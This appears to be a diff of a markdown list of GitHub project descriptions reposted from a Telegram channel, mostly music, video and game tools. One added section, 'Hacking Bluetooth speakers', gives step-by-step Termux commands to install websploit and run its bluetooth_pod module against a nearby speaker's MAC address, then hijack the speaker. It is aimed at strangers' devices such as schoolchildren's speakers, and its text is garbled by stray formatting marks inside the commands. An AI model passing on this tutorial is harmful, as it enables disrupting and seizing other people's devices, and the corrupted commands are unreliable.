+__[GitHub](https://t.me/github_community) | #TypeScript #Game #Engine
+
+- 🐙 **Source Code:** [https://github.com/boardgameio/boardgame.io](https://github.com/boardgameio/boardgame.io)
+- 👤 **Developer:** [boardgameio](https://github.com/boardgameio)
+
+
+---
+
+### 📦 Hacking Bluetooth speakers
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Sa**lute, bandits! I think many schoolchildren with speakers playing terrible music are enraged. And I think everyone would like to drown out this nightmare. In this post, you will learn how to break the Bluetooth connection between the speaker and the phone, and even connect to** it and turn** `on your mus`**i**c`.
+
+Installation
+
+$ `**p**k`g update
+$ pkg i`**n**s`tall python
+$ pkg in`**s**t`all git
+$ pkg insta`**l**l` python2
+$ pip2 install scapy
+$ git clone https://git`**h**u`b.com/The404H`**a**c`king/websploit
+$ cd webspl`**oit
+$ chm**o`d 777 * websploit.py
+
+`launch
+
+$ python2 websploit.py
+
+We open the utility**.** `Next, we write the following:`
+
+$ use bluetooth/bluetooth_pod
+
+Then follow the link a[nd ](https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp&hl=ru&gl=US)download "nRF Connect" - [LINK](https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp&hl=ru&gl=US) Install and open, after which we give the necessary permissions. Click "SCAN", look for the column, and copy its mac-address.
+
+We return to T**e**r`mux and write`** **t`he following:
+
+$ set `**s**i`ze 99`9
+$ set bdaddr mac address
+$ run
+
+Instead of "mac-ad[d](https://t.me/Oblako_sxem)ress" paste the copied mac-address. Further, as soon as the speaker stops playing sound, this means that we have broken the connection, so we immediately try to connect [via](https://t.me/Oblako_sxem) "nRF Connect" to the speaker.
+
+It is also worth clarifying that if the distance to the co[l](https://t.me/Oblako_sxem)umn is too large, then nothing will come of it. In this way, you can break the connection not only of the bluetoot[h s](https://t.me/Oblako_sxem)peaker, but also of any other devices with a "blue tooth".
+
+For more power, I advise you to create as many as 8 sessions and launch an attack in all ✌️‌‌
+
+- 🌐 **Official Website:** [https://git`**h**u`b.com/The404H`**a**c`king/websploit](https://git`**h**u`b.com/The404H`**a**c`king/websploit)
+
+
+---
+
+### 📦 Pytube
+
+> **Categories:** `#Python` `#Video` `#Interesting` `#Useful`
+
+Pytube also allows you to specify callback functions for various loading events such as progress or completion
+
+Additionally, pytube includes a command line utility that allows you to download videos directly from the terminal
+
+[GitHub](https://t.me/github_community) | #Python #Video #Interesting #Useful
+
+- 🐙 **Source Code:** [https://github.com/pytube/pytube](https://github.com/pytube/pytube)
+- 👤 **Developer:** [pytube](https://github.com/pytube)
+
+
+---
+
 ### 📦 Retro** Music Player | Material You Design Music Player for Android music lovers
 
 > **Categories:** `#Android`
@@ -4836,6 +8030,56 @@ About us:
 Platform(s); #Android
 
 - 🐙 **Source Code:** [https://telegra.ph/Retro-Music-Player-Features-04-12](https://telegra.ph/Retro-Music-Player-Features-04-12)
+
+
+---
+
+### 📦 GetStream/stream-draw-android
+
+> **Categories:** `#android` `#architecture` `#coroutines` `#drawing` `#hilt` `#jetpack_compose` `#kotlin` `#network` `#okhttp` `#real_time` `#retrofit` `#stream_chat` `#stream_draw`
+
+🛥 Stream Draw is a real-time multiplayer drawing & chat game app built entirely with Jetpack Compose.
+**Language**: Kotlin
+
+- 🐙 **Source Code:** [https://github.com/GetStream/stream-draw-android](https://github.com/GetStream/stream-draw-android)
+- 👤 **Developer:** [GetStream](https://github.com/GetStream)
+
+
+---
+
+### 📦 Kbd Audio
+
+> **Categories:** `#Cpp` `#Audio` `#Interesting` `#spy`
+
+**Keytap** – A very interesting tool, it can guess the keys pressed on the keyboard only by analyzing the sound captured from the computer microphone.
+
+__"This is what mechanical keyboard users deserve" - random comment__
+
+• [**Detailed description**](https://ggerganov.github.io/jekyll/update/2018/11/30/keytap-description-and-thoughts.html)
+• [**Video: short demonstration of Keytap in action**](https://www.youtube.com/watch?v=2OjzI9m7W10)
+
+**Keytap2 – **another interesting tool for restoring text from audio. It does not require training data - instead it uses statistical information about letter and n-gram frequencies in English.
+
+• [**More detailed description of the tool**](https://github.com/ggerganov/kbd-audio/discussions/31)
+
+[GitHub](https://t.me/github_community) | #Cpp #Audio #Interesting
+
+- 🐙 **Source Code:** [https://github.com/ggerganov/kbd-audio](https://github.com/ggerganov/kbd-audio)
+- 👤 **Developer:** [ggerganov](https://github.com/ggerganov)
+
+
+---
+
+### 📦 Mimesis
+
+> **Categories:** `#Python` `#Security` `#Interesting` `#Media` `#GitHub` `#OpenSource`
+
+Can be used to create test databases, data in JSON or XML format
+
+[GitHub](https://t.me/github_community) | #Python #Security #Interesting
+
+- 🐙 **Source Code:** [https://github.com/lk-geimfari/mimesis](https://github.com/lk-geimfari/mimesis)
+- 👤 **Developer:** [lk-geimfari](https://github.com/lk-geimfari)
 
 
 ---
@@ -4916,6 +8160,21 @@ Platform(s); #Android
 
 ---
 
+### 📦 blackle/blamscamp
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+create a bandcamp-style audio player for selling albums on itch.io
+**Language**: HTML
+**Stars**: 121 **Issues**: 0 **Forks**: 8
+[https://github.com/blackle/blamscamp](https://github.com/blackle/blamscamp)
+
+- 🐙 **Source Code:** [https://github.com/blackle/blamscamp](https://github.com/blackle/blamscamp)
+- 👤 **Developer:** [blackle](https://github.com/blackle)
+
+
+---
+
 ### 📦 SpotiFlyer
 
 > **Categories:** `#Android`
@@ -4956,80 +8215,507 @@ Platform(s); #Android
 
 ---
 
-### 📦 steve228uk/YouTube-Music
+### 📦 krystalgamer/stem-player-emulator
 
-> **Categories:** `#mac` `#macos` `#music` `#osx` `#swift` `#wrapper` `#youtube`
+> **Categories:** `#GitHub` `#OpenSource`
 
-:musical_note: A Mac app wrapper for music.youtube.com
-**Language**: Swift
+Kanye West's stem player emulator
+**Language**: JavaScript
+**Stars**: 167 **Issues**: 0 **Forks**: 25
+[https://github.com/krystalgamer/stem-player-emulator](https://github.com/krystalgamer/stem-player-emulator)
 
-- 🐙 **Source Code:** [https://github.com/steve228uk/YouTube-Music](https://github.com/steve228uk/YouTube-Music)
-- 👤 **Developer:** [steve228uk](https://github.com/steve228uk)
-
-
----
-
-### 📦 SmallRuralDog/electron-vue-music
-
-> **Categories:** `#electron` `#electron_vue` `#music` `#music_player`
-
-A music player developed based on electron-vue, the interface imitates QQ Music, and the technology stack is electron-vue+vue+vuex+vue-router+element- UI. Continuously updated, welcome to star
-**Language**: Vue
-
-- 🐙 **Source Code:** [https://github.com/SmallRuralDog/electron-vue-music](https://github.com/SmallRuralDog/electron-vue-music)
-- 👤 **Developer:** [SmallRuralDog](https://github.com/SmallRuralDog)
+- 🐙 **Source Code:** [https://github.com/krystalgamer/stem-player-emulator](https://github.com/krystalgamer/stem-player-emulator)
+- 👤 **Developer:** [krystalgamer](https://github.com/krystalgamer)
 
 
 ---
 
-### 📦 kennethreitz/pytheory
+### 📦 TheRealOrange/terminalvideoplayer
 
-> **Categories:** `#music` `#music_theory` `#python` `#scales` `#sympy`
+> **Categories:** `#GitHub` `#OpenSource`
 
-Music Theory for Humans.
+**Language**: C++
+**Stars**: 179 **Issues**: 4 **Forks**: 2
+[https://github.com/TheRealOrange/terminalvideoplayer](https://github.com/TheRealOrange/terminalvideoplayer)
+
+- 🐙 **Source Code:** [https://github.com/TheRealOrange/terminalvideoplayer](https://github.com/TheRealOrange/terminalvideoplayer)
+- 👤 **Developer:** [TheRealOrange](https://github.com/TheRealOrange)
+
+
+---
+
+### 📦 Yetangitu/Spodcast
+
+> **Categories:** `#podcast_fetcher` `#rss_generator` `#spotify_api`
+
+Spodcast is a caching Spotify podcast to RSS proxy. Using Spodcast you can follow Spotify-hosted netcasts/podcasts using any player which supports RSS, thus enabling the use of older hardware which is not compatible with the Spotify (web) app.
 **Language**: Python
 
-- 🐙 **Source Code:** [https://github.com/kennethreitz/pytheory](https://github.com/kennethreitz/pytheory)
-- 👤 **Developer:** [kennethreitz](https://github.com/kennethreitz)
+- 🐙 **Source Code:** [https://github.com/Yetangitu/Spodcast](https://github.com/Yetangitu/Spodcast)
+- 👤 **Developer:** [Yetangitu](https://github.com/Yetangitu)
 
 
 ---
 
-### 📦 lieff/minih264
+### 📦 WorldQL/worldql_server
 
-> **Categories:** `#codec` `#encoder` `#encoding` `#h264` `#h264_svc` `#mini` `#minimal` `#single_header` `#single_header_lib` `#svc` `#video` `#video_codec` `#x264`
+> **Categories:** `#GitHub` `#OpenSource`
 
-Minimalistic H264/SVC encoder single header library
-**Language**: C
+The spatial message broker and database for real-time multiplayer experiences. Official Rust implementation.
+**Language**: Rust
+**Stars**: 104 **Issues**: 1 **Forks**: 9
+[https://github.com/WorldQL/worldql_server](https://github.com/WorldQL/worldql_server)
 
-- 🐙 **Source Code:** [https://github.com/lieff/minih264](https://github.com/lieff/minih264)
-- 👤 **Developer:** [lieff](https://github.com/lieff)
+- 🐙 **Source Code:** [https://github.com/WorldQL/worldql_server](https://github.com/WorldQL/worldql_server)
+- 👤 **Developer:** [WorldQL](https://github.com/WorldQL)
 
 
 ---
 
-### 📦 kylestetz/slang
+### 📦 glibg10b/ltt-linux-challenge-issues
 
-> **Categories:** `#audio` `#javascript` `#livecoding` `#programming_language` `#Interesting`
+> **Categories:** `#linustechtips` `#linux` `#user_experience` `#youtube`
 
-🎤 a simple audio programming language implemented in JS
+A list of issues Linus and Luke experienced during the LTT Linux Daily Driver Challenge
+
+- 🐙 **Source Code:** [https://github.com/glibg10b/ltt-linux-challenge-issues](https://github.com/glibg10b/ltt-linux-challenge-issues)
+- 👤 **Developer:** [glibg10b](https://github.com/glibg10b)
+
+
+---
+
+### 📦 pgamerx/yt-dislikes-viewer
+
+> **Categories:** `#chrome` `#chrome_extension` `#chrome_extensions` `#chromium` `#chromium_extension` `#dislikes` `#dislikes_count` `#likes_dislikes` `#mozilla` `#mozilla_firefox` `#mozilla_firefox_addon` `#youtube` `#youtube_api` `#youtube_api_v3` `#youtube_extension`
+
+A browser extension that allows you to see dislikes on a youtube video after the youtube update
 **Language**: JavaScript
 
-- 🐙 **Source Code:** [https://github.com/kylestetz/slang](https://github.com/kylestetz/slang)
-- 👤 **Developer:** [kylestetz](https://github.com/kylestetz)
+- 🐙 **Source Code:** [https://github.com/pgamerx/yt-dislikes-viewer](https://github.com/pgamerx/yt-dislikes-viewer)
+- 👤 **Developer:** [pgamerx](https://github.com/pgamerx)
 
 
 ---
 
-### 📦 IvanVorobei/SPStorkController
+### 📦 Anarios/return-youtube-dislike
 
-> **Categories:** `#alert` `#animation` `#app` `#apple` `#controller` `#gester` `#ios11` `#mail` `#mimicrate` `#music` `#native` `#pop` `#popover` `#popup` `#similar` `#swift` `#swipe` `#ui` `#up` `#ux`
+> **Categories:** `#GitHub` `#OpenSource` `#JavaScript` `#Youtube` `#Extension`
 
-Modal controller as in mail or Apple music application
+Chrome extension to return youtube dislikes
+**Language**: JavaScript
+**Stars**: 143 **Issues**: 0 **Forks**: 7
+[https://github.com/Anarios/return-youtube-dislike](https://github.com/Anarios/return-youtube-dislike)
+
+- 🐙 **Source Code:** [https://github.com/Anarios/return-youtube-dislike](https://github.com/Anarios/return-youtube-dislike)
+- 👤 **Developer:** [Anarios](https://github.com/Anarios)
+
+
+---
+
+### 📦 DusteDdk/dstream
+
+> **Categories:** `#GitHub` `#OpenSource` `#Server` `#HTML`
+
+bespoke music player for web
+**Language**: JavaScript
+**Stars**: 178 **Issues**: 1 **Forks**: 9
+[https://github.com/DusteDdk/dstream](https://github.com/DusteDdk/dstream)
+
+- 🐙 **Source Code:** [https://github.com/DusteDdk/dstream](https://github.com/DusteDdk/dstream)
+- 👤 **Developer:** [DusteDdk](https://github.com/DusteDdk)
+
+
+---
+
+### 📦 ekzhang/****composing.studio
+
+> **Categories:** `#abc_notation` `#collaborative_editing` `#music` `#music_composition` `#react` `#rust` `#typescript`
+
+Collaborative music composition for everyone.
+**Language**: TypeScript
+
+- 🐙 **Source Code:** [https://github.com/ekzhang/composing.studio](https://github.com/ekzhang/composing.studio)
+- 👤 **Developer:** [ekzhang](https://github.com/ekzhang)
+
+
+---
+
+### 📦 TangStudio/PathView
+
+> **Categories:** `#android` `#kotlin` `#training` `#playground` `#animation` `#stopwatch` `#sport` `#wearable_devices` `#pathview`
+
+Simulate the running route of each player on the playground, and can be timed with a stopwatch
+**Language**: Kotlin
+
+- 🐙 **Source Code:** [https://github.com/TangStudio/PathView](https://github.com/TangStudio/PathView)
+- 👤 **Developer:** [TangStudio](https://github.com/TangStudio)
+
+
+---
+
+### 📦 SartoxOnlyGNU/audacium
+
+> **Categories:** `#audio` `#editor` `#audacity` `#audacium`
+
+Audacity fork without Telemetry and with new features
+**Language**: C
+
+- 🐙 **Source Code:** [https://github.com/SartoxOnlyGNU/audacium](https://github.com/SartoxOnlyGNU/audacium)
+- 👤 **Developer:** [SartoxOnlyGNU](https://github.com/SartoxOnlyGNU)
+
+
+---
+
+### 📦 benthecoder/yt-channels-DS-AI-ML-CS
+
+> **Categories:** `#python` `#learning` `#lists` `#data_science` `#data` `#machine_learning` `#youtube` `#awesome` `#statistics` `#ai` `#deep_learning` `#math` `#ml` `#resources` `#artificial_intelligence` `#data_analysis` `#awesome_list` `#dataengineering`
+
+A comprehensive list of YouTube Channels for Data Science,  Data Engineering, Machine Learning, Deep learning, Computer Science, programming, software engineering, etc.
+
+- 🐙 **Source Code:** [https://github.com/benthecoder/yt-channels-DS-AI-ML-CS](https://github.com/benthecoder/yt-channels-DS-AI-ML-CS)
+- 👤 **Developer:** [benthecoder](https://github.com/benthecoder)
+
+
+---
+
+### 📦 LingDong-****/legumes
+
+> **Categories:** `#renderer` `#vector_graphics` `#sheet_music` `#hershey_fonts` `#polylines`
+
+🎼 A sheet music to polylines renderer
+**Language**: TypeScript
+
+- 🐙 **Source Code:** [https://github.com/LingDong-/legumes](https://github.com/LingDong-/legumes)
+- 👤 **Developer:** [LingDong-](https://github.com/LingDong-)
+
+
+---
+
+### 📦 BMSVieira/moovie.js
+
+> **Categories:** `#html5` `#player` `#player_controls` `#player_video` `#vanilla_javascript` `#vanillajs`
+
+Movie focused HTML5 Player
+**Language**: JavaScript
+
+- 🐙 **Source Code:** [https://github.com/BMSVieira/moovie.js](https://github.com/BMSVieira/moovie.js)
+- 👤 **Developer:** [BMSVieira](https://github.com/BMSVieira)
+
+
+---
+
+### 📦 jpsim/ZenTuner
+
+> **Categories:** `#ios` `#macos` `#music` `#swift` `#swiftui` `#tuner`
+
+A minimal chromatic tuner.
 **Language**: Swift
 
-- 🐙 **Source Code:** [https://github.com/IvanVorobei/SPStorkController](https://github.com/IvanVorobei/SPStorkController)
+- 🐙 **Source Code:** [https://github.com/jpsim/ZenTuner](https://github.com/jpsim/ZenTuner)
+- 👤 **Developer:** [jpsim](https://github.com/jpsim)
+
+
+---
+
+### 📦 zju3dv/EasyMocap
+
+> **Categories:** `#GitHub` `#OpenSource` `#Interesting` `#Video`
+
+Make human motion capture easier.
+**Language**: Python
+**Stars**: 117 **Issues**: 0 **Forks**: 11
+[https://github.com/zju3dv/EasyMocap](https://github.com/zju3dv/EasyMocap)
+
+- 🐙 **Source Code:** [https://github.com/zju3dv/EasyMocap](https://github.com/zju3dv/EasyMocap)
+- 👤 **Developer:** [zju3dv](https://github.com/zju3dv)
+
+
+---
+
+### 📦 victor369basu/Real-time-stock-market-prediction
+
+> **Categories:** `#deep_learning` `#kafka` `#machine_learning` `#mongodb` `#nodejs` `#streaming` `#tensorflow` `#tensorflowjs` `#tensorflowjs_models`
+
+In this repository, I have developed the entire server-side principal architecture for real-time stock market prediction with Machine Learning. I have used Tensorflow.js for constructing ml model architecture, and Kafka for real-time data streaming and pipelining.
+**Language**: JavaScript
+
+- 🐙 **Source Code:** [https://github.com/victor369basu/Real-time-stock-market-prediction](https://github.com/victor369basu/Real-time-stock-market-prediction)
+- 👤 **Developer:** [victor369basu](https://github.com/victor369basu)
+
+
+---
+
+### 📦 iampawan/AI-Radio
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+This is a radio app where you can ask Alan AI to play some music.
+**Language**: C++
+**Stars**: 123 **Issues**: 0 **Forks**: 21
+[https://github.com/iampawan/AI-Radio](https://github.com/iampawan/AI-Radio)
+
+- 🐙 **Source Code:** [https://github.com/iampawan/AI-Radio](https://github.com/iampawan/AI-Radio)
+- 👤 **Developer:** [iampawan](https://github.com/iampawan)
+
+
+---
+
+### 📦 denverquane/amongusdiscord
+
+> **Categories:** `#among_us` `#automute` `#discord_bot`
+
+Discord Bot to scrape Among Us on-screen data and automatically mute players between rounds
+**Language**: Go
+
+- 🐙 **Source Code:** [https://github.com/denverquane/amongusdiscord](https://github.com/denverquane/amongusdiscord)
+- 👤 **Developer:** [denverquane](https://github.com/denverquane)
+
+
+---
+
+### 📦 irshadshalu/music-grid
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+A Music Grid you can play around and create short music.
+**Language**: HTML
+**Stars**: 165 **Issues**: 7 **Forks**: 12
+[https://github.com/irshadshalu/music-grid](https://github.com/irshadshalu/music-grid)
+
+- 🐙 **Source Code:** [https://github.com/irshadshalu/music-grid](https://github.com/irshadshalu/music-grid)
+- 👤 **Developer:** [irshadshalu](https://github.com/irshadshalu)
+
+
+---
+
+### 📦 openai/jukebox
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Code for "Jukebox: A Generative Model for Music"
+**Language**: Python
+**Stars**: 446 **Issues**: 5 **Forks**: 23
+[https://github.com/openai/jukebox](https://github.com/openai/jukebox)
+
+- 🐙 **Source Code:** [https://github.com/openai/jukebox](https://github.com/openai/jukebox)
+- 👤 **Developer:** [openai](https://github.com/openai)
+
+
+---
+
+### 📦 calebj0seph/spectro
+
+> **Categories:** `#app` `#application` `#audio` `#audio_visualizer` `#dsp` `#fft` `#javascript` `#material_design` `#material_ui` `#microphone` `#react` `#sound` `#spectrogram` `#typescript` `#web` `#webgl` `#webgl_experiments`
+
+🎶 Real-time audio spectrogram generator for the web
+**Language**: TypeScript
+
+- 🐙 **Source Code:** [https://github.com/calebj0seph/spectro](https://github.com/calebj0seph/spectro)
+- 👤 **Developer:** [calebj0seph](https://github.com/calebj0seph)
+
+
+---
+
+### 📦 pakastin/car
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Multiplayer 2d car physics with JavaScript!
+**Language**: JavaScript
+**Stars**: 242 **Issues**: 6 **Forks**: 16
+https://github.com/pakastin/car
+
+- 🐙 **Source Code:** [https://github.com/pakastin/car](https://github.com/pakastin/car)
+- 👤 **Developer:** [pakastin](https://github.com/pakastin)
+
+
+---
+
+### 📦 ZahraHeydari/MusicPlayer
+
+> **Categories:** `#android_app` `#android_clean_architecture_kotlin` `#android_clean_architecture_sample` `#android_cleanarchitecture` `#broadcast_reciever` `#dependency_injection` `#exoplayer` `#exoplayer2` `#koin` `#livedata` `#livedata_viewmodel` `#music_player` `#mvvm` `#mvvm_android` `#mvvm_architecture` `#notification_android` `#notification_service` `#notifications` `#room_database` `#service`
+
+Implemented using Clean Arch, MVVM, LiveData, Room, Koin, Coil, Service, Notification and ExoPlayer
+**Language**: Kotlin
+
+- 🐙 **Source Code:** [https://github.com/ZahraHeydari/MusicPlayer](https://github.com/ZahraHeydari/MusicPlayer)
+- 👤 **Developer:** [ZahraHeydari](https://github.com/ZahraHeydari)
+
+
+---
+
+### 📦 paulirish/lite-youtube-embed
+
+> **Categories:** `#GitHub` `#OpenSource` `#Interesting` `#Web` `#Video`
+
+A faster youtube embed.
+**Language**: HTML
+**Stars**: 119 **Issues**: 1 **Forks**: 3
+https://github.com/paulirish/lite-youtube-embed
+
+- 🐙 **Source Code:** [https://github.com/paulirish/lite-youtube-embed](https://github.com/paulirish/lite-youtube-embed)
+- 👤 **Developer:** [paulirish](https://github.com/paulirish)
+
+
+---
+
+### 📦 cawfree/react-native-quiet
+
+> **Categories:** `#audio` `#chirp` `#data` `#quiet` `#quietjs` `#react` `#react_native` `#send` `#transmit` `#ultrasonic`
+
+🤫 Quiet for React Native.
+**Language**: JavaScript
+
+- 🐙 **Source Code:** [https://github.com/cawfree/react-native-quiet](https://github.com/cawfree/react-native-quiet)
+- 👤 **Developer:** [cawfree](https://github.com/cawfree)
+
+
+---
+
+### 📦 fornclake/TetraForce
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+GBC Zelda-inspired game with online multiplayer. Built with Godot Engine
+**Language**: GDScript
+**Stars**: 113 **Issues**: 8 **Forks**: 22
+https://github.com/fornclake/TetraForce
+
+- 🐙 **Source Code:** [https://github.com/fornclake/TetraForce](https://github.com/fornclake/TetraForce)
+- 👤 **Developer:** [fornclake](https://github.com/fornclake)
+
+
+---
+
+### 📦 ExistentialAudio/BlackHole
+
+> **Categories:** `#audio` `#driver` `#macos`
+
+BlackHole is a modern macOS virtual audio driver that allows applications to pass audio to other applications with zero latency.
+**Language**: C
+
+- 🐙 **Source Code:** [https://github.com/ExistentialAudio/BlackHole](https://github.com/ExistentialAudio/BlackHole)
+- 👤 **Developer:** [ExistentialAudio](https://github.com/ExistentialAudio)
+
+
+---
+
+### 📦 nining377/UnblockMusicPro_Xposed
+
+> **Categories:** `#android` `#neteasecloudmusic` `#unblock` `#xposed`
+
+Unblock Netease Cloud Music with Xposed
+**Language**: Java
+
+- 🐙 **Source Code:** [https://github.com/nining377/UnblockMusicPro_Xposed](https://github.com/nining377/UnblockMusicPro_Xposed)
+- 👤 **Developer:** [nining377](https://github.com/nining377)
+
+
+---
+
+### 📦 Ignitetechnologies/Privilege-Escalation
+
+> **Categories:** `#cheatsheet` `#ctf` `#ctf_challenges` `#ctf_writeups` `#hack` `#hacking` `#oscp` `#oscp_journey` `#oscp_prep` `#privilege_escalation` `#vulnhub`
+
+This cheasheet is aimed at the CTF Players and Beginners to help them understand the fundamentals of Privilege Escalation with examples.
+
+- 🐙 **Source Code:** [https://github.com/Ignitetechnologies/Privilege-Escalation](https://github.com/Ignitetechnologies/Privilege-Escalation)
+- 👤 **Developer:** [Ignitetechnologies](https://github.com/Ignitetechnologies)
+
+
+---
+
+### 📦 qiaozi-tech/WXInlinePlayer
+
+> **Categories:** `#asm` `#h5` `#player` `#playsinline` `#wasm` `#wechat`
+
+We Can Playsinline And AutoPlay In WeChat WebView!
+**Language**: C
+
+- 🐙 **Source Code:** [https://github.com/qiaozi-tech/WXInlinePlayer](https://github.com/qiaozi-tech/WXInlinePlayer)
+- 👤 **Developer:** [qiaozi-tech](https://github.com/qiaozi-tech)
+
+
+---
+
+### 📦 trevor-laher/OnDemandMinecraft
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+An AWS hosted Minecraft server that will only run when players are active. Players can start the server through a simple UI accessed through free Heroku server hosting.
+**Language**: Python
+**Stars**: 228 **Issues**: 1 **Forks**: 12
+https://github.com/trevor-laher/OnDemandMinecraft
+
+- 🐙 **Source Code:** [https://github.com/trevor-laher/OnDemandMinecraft](https://github.com/trevor-laher/OnDemandMinecraft)
+- 👤 **Developer:** [trevor-laher](https://github.com/trevor-laher)
+
+
+---
+
+### 📦 devplayer0/cvos
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Bootable PDF CV
+**Language**: Shell
+**Stars**: 142 **Issues**: 1 **Forks**: 1
+https://github.com/devplayer0/cvos
+
+- 🐙 **Source Code:** [https://github.com/devplayer0/cvos](https://github.com/devplayer0/cvos)
+- 👤 **Developer:** [devplayer0](https://github.com/devplayer0)
+
+
+---
+
+### 📦 IvanVorobei/SPAlert
+
+> **Categories:** `#alert` `#alert_controller` `#animated` `#apple` `#apple_music` `#applemusic` `#appstore` `#feedback` `#native` `#popup` `#swift` `#ui` `#ui_components` `#uikit`
+
+Native popup alert similar to Apple Music or Feedback in AppStore app. Support animations & customisable.
+**Language**: Swift
+
+- 🐙 **Source Code:** [https://github.com/IvanVorobei/SPAlert](https://github.com/IvanVorobei/SPAlert)
 - 👤 **Developer:** [IvanVorobei](https://github.com/IvanVorobei)
+
+
+---
+
+### 📦 dotnet/spark
+
+> **Categories:** `#analytics` `#apache_spark` `#azure` `#bigdata` `#csharp` `#databricks` `#dotnet` `#dotnet_core` `#dotnet_standard` `#emr` `#fsharp` `#hdinsight` `#machine_learning` `#microsoft` `#spark` `#spark_sql` `#spark_streaming` `#streaming` `#tpcds` `#tpch`
+
+.NET for Apache® Spark™ makes Apache Spark™ easily accessible to .NET developers.
+**Language**: C#
+
+- 🐙 **Source Code:** [https://github.com/dotnet/spark](https://github.com/dotnet/spark)
+- 👤 **Developer:** [dotnet](https://github.com/dotnet)
+
+
+---
+
+### 📦 zhihu/griffith
+
+> **Categories:** `#fmp4` `#hls` `#html5_video` `#html5_video_player` `#mp4` `#mp4box` `#react` `#react_components` `#video` `#zhihu` `#zhihu_video_player`
+
+A React-based web video player
+**Language**: JavaScript
+
+- 🐙 **Source Code:** [https://github.com/zhihu/griffith](https://github.com/zhihu/griffith)
+- 👤 **Developer:** [zhihu](https://github.com/zhihu)
+
+
+---
+
+### 📦 radianttap/CardPresentationController
+
+> **Categories:** `#apple_music` `#cards` `#custom` `#popup` `#transitions` `#uikit` `#uipresentationcontroller`
+
+Custom UIPresentationController which mimics the behavior of Apple Music UI
+**Language**: Swift
+
+- 🐙 **Source Code:** [https://github.com/radianttap/CardPresentationController](https://github.com/radianttap/CardPresentationController)
+- 👤 **Developer:** [radianttap](https://github.com/radianttap)
 
 
 ---
@@ -5050,3766 +8736,80 @@ https://github.com/jellyfin/jellyfin
 
 ---
 
-### 📦 radianttap/CardPresentationController
+### 📦 IvanVorobei/SPStorkController
 
-> **Categories:** `#apple_music` `#cards` `#custom` `#popup` `#transitions` `#uikit` `#uipresentationcontroller`
+> **Categories:** `#alert` `#animation` `#app` `#apple` `#controller` `#gester` `#ios11` `#mail` `#mimicrate` `#music` `#native` `#pop` `#popover` `#popup` `#similar` `#swift` `#swipe` `#ui` `#up` `#ux`
 
-Custom UIPresentationController which mimics the behavior of Apple Music UI
+Modal controller as in mail or Apple music application
 **Language**: Swift
 
-- 🐙 **Source Code:** [https://github.com/radianttap/CardPresentationController](https://github.com/radianttap/CardPresentationController)
-- 👤 **Developer:** [radianttap](https://github.com/radianttap)
-
-
----
-
-### 📦 zhihu/griffith
-
-> **Categories:** `#fmp4` `#hls` `#html5_video` `#html5_video_player` `#mp4` `#mp4box` `#react` `#react_components` `#video` `#zhihu` `#zhihu_video_player`
-
-A React-based web video player
-**Language**: JavaScript
-
-- 🐙 **Source Code:** [https://github.com/zhihu/griffith](https://github.com/zhihu/griffith)
-- 👤 **Developer:** [zhihu](https://github.com/zhihu)
-
-
----
-
-### 📦 dotnet/spark
-
-> **Categories:** `#analytics` `#apache_spark` `#azure` `#bigdata` `#csharp` `#databricks` `#dotnet` `#dotnet_core` `#dotnet_standard` `#emr` `#fsharp` `#hdinsight` `#machine_learning` `#microsoft` `#spark` `#spark_sql` `#spark_streaming` `#streaming` `#tpcds` `#tpch`
-
-.NET for Apache® Spark™ makes Apache Spark™ easily accessible to .NET developers.
-**Language**: C#
-
-- 🐙 **Source Code:** [https://github.com/dotnet/spark](https://github.com/dotnet/spark)
-- 👤 **Developer:** [dotnet](https://github.com/dotnet)
-
-
----
-
-### 📦 IvanVorobei/SPAlert
-
-> **Categories:** `#alert` `#alert_controller` `#animated` `#apple` `#apple_music` `#applemusic` `#appstore` `#feedback` `#native` `#popup` `#swift` `#ui` `#ui_components` `#uikit`
-
-Native popup alert similar to Apple Music or Feedback in AppStore app. Support animations & customisable.
-**Language**: Swift
-
-- 🐙 **Source Code:** [https://github.com/IvanVorobei/SPAlert](https://github.com/IvanVorobei/SPAlert)
+- 🐙 **Source Code:** [https://github.com/IvanVorobei/SPStorkController](https://github.com/IvanVorobei/SPStorkController)
 - 👤 **Developer:** [IvanVorobei](https://github.com/IvanVorobei)
 
 
 ---
 
-### 📦 devplayer0/cvos
+### 📦 kylestetz/slang
 
-> **Categories:** `#GitHub` `#OpenSource`
+> **Categories:** `#audio` `#javascript` `#livecoding` `#programming_language` `#Interesting`
 
-Bootable PDF CV
-**Language**: Shell
-**Stars**: 142 **Issues**: 1 **Forks**: 1
-https://github.com/devplayer0/cvos
+🎤 a simple audio programming language implemented in JS
+**Language**: JavaScript
 
-- 🐙 **Source Code:** [https://github.com/devplayer0/cvos](https://github.com/devplayer0/cvos)
-- 👤 **Developer:** [devplayer0](https://github.com/devplayer0)
+- 🐙 **Source Code:** [https://github.com/kylestetz/slang](https://github.com/kylestetz/slang)
+- 👤 **Developer:** [kylestetz](https://github.com/kylestetz)
 
 
 ---
 
-### 📦 trevor-laher/OnDemandMinecraft
+### 📦 lieff/minih264
 
-> **Categories:** `#GitHub` `#OpenSource`
+> **Categories:** `#codec` `#encoder` `#encoding` `#h264` `#h264_svc` `#mini` `#minimal` `#single_header` `#single_header_lib` `#svc` `#video` `#video_codec` `#x264`
 
-An AWS hosted Minecraft server that will only run when players are active. Players can start the server through a simple UI accessed through free Heroku server hosting.
-**Language**: Python
-**Stars**: 228 **Issues**: 1 **Forks**: 12
-https://github.com/trevor-laher/OnDemandMinecraft
-
-- 🐙 **Source Code:** [https://github.com/trevor-laher/OnDemandMinecraft](https://github.com/trevor-laher/OnDemandMinecraft)
-- 👤 **Developer:** [trevor-laher](https://github.com/trevor-laher)
-
-
----
-
-### 📦 qiaozi-tech/WXInlinePlayer
-
-> **Categories:** `#asm` `#h5` `#player` `#playsinline` `#wasm` `#wechat`
-
-We Can Playsinline And AutoPlay In WeChat WebView!
+Minimalistic H264/SVC encoder single header library
 **Language**: C
 
-- 🐙 **Source Code:** [https://github.com/qiaozi-tech/WXInlinePlayer](https://github.com/qiaozi-tech/WXInlinePlayer)
-- 👤 **Developer:** [qiaozi-tech](https://github.com/qiaozi-tech)
